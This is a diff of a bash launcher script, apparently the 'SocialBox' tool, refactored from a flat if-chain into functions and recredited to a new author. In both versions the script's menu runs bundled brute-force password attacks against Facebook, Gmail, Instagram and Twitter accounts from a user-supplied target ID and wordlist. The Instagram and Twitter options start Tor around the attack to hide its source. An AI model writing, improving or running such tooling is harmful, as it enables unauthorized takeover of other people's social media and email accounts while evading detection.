@@ -1,154 +1,123 @@
 #!/bin/bash
-#Colors
-white="\033[1;37m"
-grey="\033[0;37m"
-purple="\033[0;35m"
-red="\033[1;31m"
-green="\033[1;32m"
-yellow="\033[1;33m"
-Purple="\033[0;35m"
-Cyan="\033[0;36m"
-Cafe="\033[0;33m"
-Fiuscha="\033[0;35m"
-blue="\033[1;34m"
-nc="\e[0m"
-#ROOT PRIVILEGIES
+
+# Colors
+declare -A COLORS=(
+    [white]="\033[1;37m"
+    [grey]="\033[0;37m"
+    [purple]="\033[0;35m"
+    [red]="\033[1;31m"
+    [green]="\033[1;32m"
+    [yellow]="\033[1;33m"
+    [blue]="\033[1;34m"
+    [cyan]="\033[0;36m"
+    [nc]="\e[0m"
+)
+
+# Ensure script is run as root
 if [[ $EUID -ne 0 ]]; then
-        echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
-        exit 1
+    echo -e "${COLORS[red]}You don't have root privileges. Execute the script as root.${COLORS[nc]}"
+    exit 1
 fi
-#Installation
-sleep 1
-echo -e "Checking Installation $nc"
+
+# Install dependencies
+echo -e "Checking installation..."
 bash install-sb.sh
-echo -e "Checking Completed [$green✓$nc] $nc "
+echo -e "Checking completed [${COLORS[green]}✓${COLORS[nc]}]"
 sleep 1
 clear
-#Startup
-echo -e "$green"
-echo "		.▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
-echo "		▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
-echo "		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
-echo "		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
-echo -e "		 ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v1$nc"
-echo -e "	[+]              $red Coded By Belahsan Ouerghi$nc         		   [+]"
-echo -e "	[+] 		 $red www.facebook.com/ouerghi.belahsan$nc 		   [+]"
-echo -e "	[+] 		 $red Greetz To All Pentesters$nc          		   [+]"
-echo -e "	[+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles}$nc [+]"
-echo ""
-echo -e "$yellow Select From Menu : $nc"
-echo ""
-echo -e "		$Cyan 1 : Brute Force Facebook Account$nc"
-echo -e "		$Cyan 2 : Brute Force Gmail Account$nc"
-echo -e "		$Cyan 3 : Brute Force Instagram Account$nc"
-echo -e "		$Cyan 4 : Brute Force Twitter Account$nc"
-echo -e "		$Cyan 99: Exit$nc"
-read -p "Choice >  " ch
-if [ $ch = 1 ]; then
-echo -e "			$Cyan Facebook Brute Force$nc"
-echo -e "$green"
-read -p "Enter Facebook ID / Email / Username / Number: " id
-read -p "Enter wordlist path : " wordlist
-echo -e "$nc"
-cd facebook
-perl fb-brute.pl $id $wordlist
-echo -e " 		[+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
-echo -e "$red"
-read -p "Wanna Back To Main Menu [ Y / n ] : " check
-echo -e "$nc"
-if [ $check = "Y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check = "y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check = "Yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check = "yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check = "YES" ]; then
-cd .. && bash SocialBox.sh
-else
-exit 1
-fi
-elif [ $ch = 2 ]; then
-echo -e "			$Cyan Gmail Brute Force$nc"
-cd Gemail-Hack
-python gemailhack.py
-echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
-echo -e "$red"
-read -p "Wanna Back To Main Menu [ Y / n ] : " check2
-echo -e "$nc"
-if [ $check2 = "Y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check2 = "y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check2 = "Yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check2 = "yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check2 = "YES" ]; then
-cd .. && bash SocialBox.sh
-else
-exit 1
-fi
-elif [ $ch = 3 ]; then
-echo -e "			$Cyan Instagram Brute Force$nc"
-cd instainsane/
-sleep 0.025
-	echo -e "	[+]$red Service Tor Stated $nc[+]"
-sleep 0.9
-service tor start
-./instainsane.sh
-echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
-service tor stop
-echo -e "		[+]$red Service Tor Stopped$nc [+]"
-echo -e "$red"
-read -p "Wanna Back To Main Menu [ Y / n ] : " check3
-echo -e "$nc"
-if [ $check3 = "Y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check3 = "y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check3 = "Yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check3 = "yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check3 = "YES" ]; then
-cd .. && bash SocialBox.sh
-else
-exit 1
-fi
-elif [ $ch = 4 ]; then
-echo -e "			$Cyan Twitter Brute Force$nc"
-cd tweetshell/
-sleep 0.025
-        echo -e "	[+]$red Service Tor Stated $nc[+]"
-sleep 0.9
-service tor start
-bash tweetshell.sh
-echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
-service tor stop
-echo -e "		[+]$red Service Tor Stopped$nc [+]"
-echo -e "$red"
-read -p "Wanna Back To Main Menu [ Y / n ] : " check4
-echo -e "$nc"
-if [ $check4 = "Y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check4 = "y" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check4 = "Yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check4 = "yes" ]; then
-cd .. && bash SocialBox.sh
-elif [ $check4 = "YES" ]; then
-cd .. && bash SocialBox.sh
-else
-exit 1
-fi
-elif [ $ch == 99 ]; then
-echo -e "$red Program Exit ...$nc"
-sleep 0.25
-exit 1
-else
-echo "Not Found 404 , Exit"
-exit 1
-fi
+
+# Display banner
+function display_banner() {
+    echo -e "${COLORS[green]}"
+    echo "        ▄▄▄· ▄▄▌  ▪   ▄▄▄·  ▐ ▄ "
+    echo "       ▐█ ▀█ ██•  ██ ▐█ ▀█ •█▌▐█"
+    echo "       ▄█▀▀█ ██▪  ▐█·▄█▀▀█ ▐█▐▐▌"
+    echo "       ▐█ ▪▐▌▐█▌▐▌▐█▌▐█ ▪▐▌██▐█▌"
+    echo "        ▀  ▀ .▀▀▀ ▀▀▀ ▀  ▀ ▀▀ █▪${COLORS[nc]}"
+    echo -e "${COLORS[blue]}v1${COLORS[nc]}"
+    echo -e "[+] ${COLORS[red]}Recoded By LightYagami28 ${COLORS[nc]} [+]"
+    echo -e "[+] ${COLORS[red]}Special Greetz To:${COLORS[nc]} ${COLORS[green]}{thelinuxchoice, Ha3MrX, Tunisian Eagles}${COLORS[nc]}"
+}
+
+# Main menu
+function main_menu() {
+    echo -e "${COLORS[yellow]}Select from the menu:${COLORS[nc]}"
+    echo -e "  ${COLORS[cyan]}1: Brute Force Facebook Account${COLORS[nc]}"
+    echo -e "  ${COLORS[cyan]}2: Brute Force Gmail Account${COLORS[nc]}"
+    echo -e "  ${COLORS[cyan]}3: Brute Force Instagram Account${COLORS[nc]}"
+    echo -e "  ${COLORS[cyan]}4: Brute Force Twitter Account${COLORS[nc]}"
+    echo -e "  ${COLORS[cyan]}99: Exit${COLORS[nc]}"
+    read -p "Choice > " choice
+    handle_choice "$choice"
+}
+
+# Handle brute force options
+function handle_choice() {
+    local choice=$1
+    case $choice in
+        1) brute_facebook ;;
+        2) brute_gmail ;;
+        3) brute_instagram ;;
+        4) brute_twitter ;;
+        99)
+            echo -e "${COLORS[red]}Program exiting...${COLORS[nc]}"
+            exit 0
+            ;;
+        *)
+            echo -e "${COLORS[red]}Invalid option. Exiting.${COLORS[nc]}"
+            exit 1
+            ;;
+    esac
+}
+
+# Brute force Facebook
+function brute_facebook() {
+    echo -e "${COLORS[cyan]}Facebook Brute Force${COLORS[nc]}"
+    read -p "Enter Facebook ID/Email/Username/Number: " id
+    read -p "Enter wordlist path: " wordlist
+    cd facebook || exit
+    perl fb-brute.pl "$id" "$wordlist"
+    complete_brute
+}
+
+# Brute force Gmail
+function brute_gmail() {
+    echo -e "${COLORS[cyan]}Gmail Brute Force${COLORS[nc]}"
+    cd Gemail-Hack || exit
+    python gemailhack.py
+    complete_brute
+}
+
+# Brute force Instagram
+function brute_instagram() {
+    echo -e "${COLORS[cyan]}Instagram Brute Force${COLORS[nc]}"
+    cd instainsane || exit
+    service tor start
+    ./instainsane.sh
+    service tor stop
+    complete_brute
+}
+
+# Brute force Twitter
+function brute_twitter() {
+    echo -e "${COLORS[cyan]}Twitter Brute Force${COLORS[nc]}"
+    cd tweetshell || exit
+    service tor start
+    bash tweetshell.sh
+    service tor stop
+    complete_brute
+}
+
+# Common completion steps
+function complete_brute() {
+    echo -e "${COLORS[yellow]}Brute Force Complete ${COLORS[green]}✓${COLORS[nc]}"
+    read -p "Back to main menu? [Y/n]: " back
+    case $back in
+        [Yy]*|Yes|YES) cd .. && main_menu ;;
+        *) exit 0 ;;
+    esac
+}
+
+# Run script
+display_banner
+main_menu
